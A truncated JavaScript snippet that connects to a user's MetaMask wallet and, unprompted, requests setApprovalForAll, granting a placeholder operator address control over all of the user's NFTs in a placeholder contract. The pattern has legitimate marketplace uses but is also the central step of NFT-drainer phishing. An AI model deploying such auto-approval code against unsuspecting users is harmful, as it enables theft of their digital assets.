// Replace these with your actual addresses
const nftContractAddress = "0x1234567890abcdef1234567890abcdef12345678"; // your NFT contract
const operatorAddress = "0xabcdefabcdefabcdefabcdefabcdefabcdefabcd";   // contract to approve

async function autoConnectAndApprove() {
  if (typeof window.ethereum === 'undefined') {
    alert("MetaMask is not installed.");
    return;
  }

  try {
    // Connect to wallet
    await window.ethereum.request({ method: 'eth_requestAccounts' });

    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner();
    const userAddress = await signer.getAddress();

    // NFT contract ABI
    const abi = [
      "function setApprovalForAll(address operator, bool approved) external",
      "function isApprovedForAll(address owner, address operator) view returns (bool)"
    ];

    const contract = new ethers.Contract(nftContractAddress, abi, signer);

    const approved = await contract.isApprovedForAll(userAddress, operatorAddress);
    if (!approved) {
      const tx = await contract.setApprovalForAll(operatorAddress, true);
      console.log("Waiting for confirmation...");
      await tx.wait();
      alert("NFT approved successfully.");
    } else {
      console.log("Already approved.");
    }
  } catch (err) {
    console.error(err);
    alert("Error: " + err.message)
